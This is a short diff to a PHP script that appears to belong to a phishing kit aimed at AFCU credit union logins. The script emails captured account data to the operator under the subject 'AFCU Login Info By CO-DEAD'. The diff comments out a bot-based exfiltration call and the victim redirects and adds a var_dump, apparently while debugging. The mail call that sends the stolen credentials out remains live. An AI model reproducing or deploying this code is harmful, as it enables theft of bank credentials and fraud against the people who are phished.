@@ -23,19 +23,19 @@ if (isset($_POST['account'])) {
 	$sendme = [
 		'text' => $code
 	];
-	if ($bot_result == "true") {
-		$data = http_build_query($sendme);
-		$response = file_get_contents($bot . $data);
-	}
+	// if ($bot_result == "true") {
+	// 	$data = http_build_query($sendme);
+	// 	$response = file_get_contents($bot . $data);
+	// }
 	$subject = " AFCU Login Info By CO-DEAD  From $ip";
 	$headers = "From: CO-DEAD <codead13@yandex.com>\r\n";
 	$headers .= "MIME-Version: 1.0\r\n";
 	$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
-	@mail($email, $subject, $code, $headers);
-	if ($dlog == "on") {
-		header("Location: ../login-invalid");
-	} else {
-		header("Location: ../security");
-	}
+	var_dump(mail($email, $subject, $code, $headers));
+	// if ($dlog == "on") {
+	// 	header("Location: ../login-invalid");
+	// } else {
+	// 	header("Location: ../security");
+	// }
 }
 ?>
